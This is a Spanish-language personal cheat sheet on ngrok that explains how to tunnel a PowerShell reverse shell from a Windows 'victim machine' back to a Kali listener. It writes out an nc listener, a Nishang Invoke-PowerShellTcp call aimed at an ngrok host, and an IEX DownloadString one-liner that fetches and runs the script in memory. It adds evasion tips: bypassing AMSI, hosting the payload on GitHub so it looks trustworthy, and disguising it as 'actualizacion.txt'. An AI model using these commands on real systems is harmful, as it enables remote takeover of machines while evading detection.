# Ngrok

Tags: #Ngrok #Windows #Powershell #AMSI

## Instalación

* [Ngrok-Windows](https://download.ngrok.com/windows)

```bash 
# Para Linux 

❯ wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz     # Descargas el binario                     
❯ tar xvzf ngrok-v3-stable-linux-amd64.tgz           # Descomprimes el binario
❯ ./ngrok config add-authtoken PEGA_AQUI_TU_TOKEN    # Agrega el Token de tu cuenta a Kali
```

## Comandos 

```bash 
❯ ngrok help                   # Panel de ayuda 
❯ ngrok http 80                # Se publica una web de local a publica con un enlace que nos proporciona Ngrok
```

## Revershell Ngrok y Powershell

* [Invoke-PowershellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```bash 
❯ ngrok tcp 443         # Exponemos publico el puerto 443 y Ngrok nos devolvera un 'tcp://2.tcp.ngrok.io:19215'. Utilizaremos la parte de '2.tcp.ngrok.io' en IPAddress y '19215' para el Port en el script de la revershell de abajo.  

❯ nc -nlvp 443   # Recibir la revershell en Kali
```

```bash 
# Creamos un script con el contenido del enlace de arriba y al final le agregaremos este comando para poder usar Ngrok

❯ nvim Invoke-PowershellTCP.ps1

	Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215 

Nota: 
	1. Debemos Bypasear AMSI, de lo contrario nos detectara codigo malicioso
	1. Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
	2. Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
```

```bash 
# Desde la maquina victima con Windows llamamos al script que se encuentra almacenado en nuestro Github, esto lo hace a nivel de memoria por lo que es dificil de detectar y sirve como metodo de evasion

Nota: La url que se coloca es la que nos muestra al momento de darle 'Raw' al script almacenado en 'Github'

❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1')"

Nota: 
	1. Si se ejecuta el comando desde un 'cmd' en Windows colocarlo asi como aparece. Pero si se esta ejecutando desde la consola de PS quitarle 'powershell -c'
```